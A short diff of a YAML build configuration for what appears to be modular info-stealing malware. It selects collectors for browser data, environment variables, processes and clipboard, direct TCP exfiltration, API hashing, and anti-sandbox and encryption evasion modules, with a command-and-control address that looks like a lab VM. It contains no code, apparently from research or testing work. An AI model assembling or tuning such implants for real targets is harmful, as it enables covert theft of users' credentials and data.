@@ -6,16 +6,18 @@ core:
 - core/file_ops
 collectors:
 - collectors/system_info
+- collectors/processes
 - collectors/browser_chromium
 - collectors/env_vars
-exfil: exfil/winhttp_api
-arch: arch/callback_abuse
-evasion:
-- evasion/stack_spoof
-- evasion/thread_stack_spoof
-- evasion/iat_pad
-- evasion/behavioral_pacing
+- collectors/clipboard
+exfil: exfil/tcp_direct
+arch: arch/sequential
 resources: true
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+- evasion/aes_encrypt
+- evasion/anti_sandbox_wmi
+- evasion/checksum_spoof
 vars:
   C2_IP: 10.0.2.2
   C2_PORT: '9001'
